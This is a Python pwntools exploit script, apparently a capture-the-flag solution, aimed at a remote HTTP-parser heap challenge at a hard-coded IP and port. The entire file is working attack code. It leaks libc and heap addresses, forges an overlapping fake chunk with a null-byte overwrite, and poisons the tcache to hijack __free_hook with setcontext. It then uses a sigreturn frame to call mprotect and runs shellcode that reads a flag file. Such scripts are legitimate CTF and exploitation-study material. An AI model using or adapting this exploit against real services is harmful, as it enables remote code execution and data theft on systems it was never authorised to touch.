from pwn import *
context.arch="amd64"
context.log_level="debug"
# sh=process("./pwn")
# 116.236.144.37:21443
sh=remote("116.236.144.37",21443)
def cmd(payload):
    sh.sendlineafter(b"parser> ", payload)
def login():
    payload='''POST /login HTTP/1.1\r
Username:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r
Connection:Keep-Alive\r
Accept-Encoding:gzip\r
Content-Length:0\r
HOST:test\r\n
'''.encode()
    # gdb.attach(sh,"b *$rebase(0x1F02)\nc")
    # gdb.attach(sh,"b exit\nc")
    cmd(payload)
def add(ctt):
    ctt_len=len(ctt)
    payload=f'POST /create HTTP/1.1\r\nUsername:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{ctt_len}\r\nHOST:test\r\n\n'.encode()
    payload+=ctt
    cmd(payload)
def delete(idx):
    payload=f'POST /delete HTTP/1.1\r\nIdx:{idx}\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:0\r\nHOST:test\r\n\n'.encode()
    cmd(payload)
def edit(idx,ctt):
    ctt_len=len(ctt)
    payload=f'POST /edit HTTP/1.1\r\nIdx:{idx}\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{ctt_len}\r\nHOST:test\r\n\n'.encode()
    payload+=ctt
    cmd(payload)
def show(idx):
    payload=f'POST /show HTTP/1.1\r\nIdx:{idx}\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:0\r\nHOST:test\r\n\n'.encode()
    cmd(payload)
def write_byts(ctt,idx):
    a=bytes(list(ctt)[::-1])
    length=len(ctt)
    i=0
    while(i<length):
        print(i)
        if a[i] == 0:
            tmp=b'a'*(length-i)
            i=i+1
            print(tmp)
            tmp_length=len(tmp)-1
        else:
            c=i
            while(i<length and a[i]!=0):
                i=i+1
            t=a[c:i]
            t=bytes(list(t)[::-1])
            print(t)
            tmp=b' '+b'a'*(length-i)+t
            print(tmp)
            tmp_length=len(tmp)-1
        print(hex(tmp_length))
        payload=f'POST /edit HTTP/1.1\r\nIdx:{idx}\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{tmp_length}\r\nHOST:test\r\n\n'.encode()
        payload+=tmp
        sh.sendafter(b"parser> ", payload)

login()
add(b'a'*0x420) #0
add(b'a'*0x20) #1
add(b'a'*0x420) #2
add(b'a'*0x20) #3
delete(0)
# gdb.attach(sh)

delete(2)
add(b'a'*0x420) #0
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
libcbase=leak_libc-0x3ebca0
success("libcbase:"+hex(libcbase))

sh.recv(2)
leak_heap=u64(sh.recv(8))
heapbase=(leak_heap>>12)<<12
success("heapbase:"+hex(heapbase))

add(b'a'*0x420) #2

fakechunk=heapbase+0xb70
target=fakechunk

add(b'a'*(0x340)) #4 0x450
add(b'a'*0xf8) #5
add(b'a'*0x4f0) #6
add(b'a'*0x20) #7

# gdb.attach(sh,"b *$rebase(0x1DF1)\nc")

write_byts(b'a'*0x50+p64(0)+p64(0x3f1)+p64(target)*2, 4)
edit(5, b'a'*0xf8)
write_byts(b'a'*0xf0+p64(0x3f0), 5)
delete(6)


add(b'a'*0x20) #6
add(b'a'*0x20) #8
delete(8)
delete(6)

libc=ELF("./libc.so.6")
libc.address=libcbase
freehook=libc.sym['__free_hook']
open=libc.sym['open']
read=libc.sym['read']
write=libc.sym['write']
mprotect=libc.sym['mprotect']
setcontext=libcbase+0x52085

tmp=b'a'*0x61+p64(freehook)[:-2]
tmp_length=len(tmp)-1
payload=f'POST /edit HTTP/1.1\r\nIdx:4\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{tmp_length}\r\nHOST:test\r\n\n'.encode()
# payload+=b'a'*0x21+p64(0)+p64(0x451-0x30)+p64(target)*2
payload+=tmp
sh.sendafter(b"parser> ", payload)


add(b'a'*0x20) #6
add(b'a'*0x20) #8
write_byts(p64(setcontext), 8)

shellcode=b'hflagH\x89\xe6j\x9c_1\xd21\xc0f\xb8\x01\x01\x0f\x05H\x89\xc71\xc0j`ZH\x89\xe6\x0f\x05j\x01_j`ZH\x89\xe6j\x01X\x0f\x05'
sig=SigreturnFrame()
sig.rdi=heapbase
sig.rsi=0x3000
sig.rdx=7
sig.rsp=heapbase+0xcf0
sig.rip=mprotect

add(b'a'*0x100) #9 +0xbe0
add(b'a'*0x100) #10 +0xcf0

write_byts(b'a'*0x8+shellcode, 10)
write_byts(p64(heapbase+0xcf8), 10)
write_byts(bytes(sig), 9)
# gdb.attach(sh,"b free\nc")
delete(9)
sh.interactive()
#heap_base+0xb40 fakechunk
#